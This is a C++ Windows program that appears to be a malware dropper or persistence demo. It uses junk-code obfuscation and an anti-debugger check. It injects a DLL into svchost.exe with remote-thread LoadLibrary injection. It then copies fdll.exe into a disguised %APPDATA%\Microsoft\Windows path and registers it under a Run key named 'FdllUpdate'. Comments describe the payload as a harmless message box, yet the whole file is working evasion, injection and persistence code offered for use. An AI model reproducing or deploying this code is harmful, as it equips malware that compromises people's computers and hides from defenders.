#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>

// Junk code for obfuscation
void JunkCode() {
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
}

// Anti-debug check
bool IsDebuggerPresentCustom() {
    return IsDebuggerPresent() || (GetTickCount() < 1000);
}

// Get PID of svchost.exe (for optional injection demo)
DWORD GetSvchostPID() {
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "svchost.exe") == 0 && pe.th32ProcessID != GetCurrentProcessId()) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// Optional: Inject a simple DLL into svchost.exe (for "modify system process" demo)
// This loads a DLL that shows a message box, but it's not persistent across reboots.
void InjectIntoSvchost() {
    const char* dllPath = "C:\\Users\\darkw\\Downloads\\fdll.dll";  // Assuming fdll.dll exists; if fdll.exe is an EXE, this won't work.
    DWORD pid = GetSvchostPID();
    if (!pid) return;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    LPVOID pRemoteMem = VirtualAllocEx(hProcess, nullptr, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, dllPath, strlen(dllPath) + 1, nullptr);

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMem, 0, nullptr);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

// Setup persistence: Copy fdll.exe to %APPDATA% and add registry Run key to run it on reboot/login
void SetupPersistence() {
    const char* sourcePath = "C:\\Users\\darkw\\Downloads\\fdll.exe";
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return;

    std::string persistPath = std::string(appDataPath) + "\\Microsoft\\Windows\\fdll.exe";
    CreateDirectoryA((std::string(appDataPath) + "\\Microsoft\\Windows").c_str(), nullptr);

    CopyFileA(sourcePath, persistPath.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring widePath(persistPath.begin(), persistPath.end());
        RegSetValueExW(hKey, L"FdllUpdate", 0, REG_SZ, (BYTE*)widePath.c_str(), (widePath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

int main() {
    JunkCode();
    if (IsDebuggerPresentCustom()) return 1;

    // Optional: Modify system process (inject into svchost for immediate effect)
    InjectIntoSvchost();

    // Setup persistence for reboots
    SetupPersistence();

    std::cout << "Persistence set. fdll.exe will run on reboot/login, showing the message box." << std::endl;
    return 0;
}
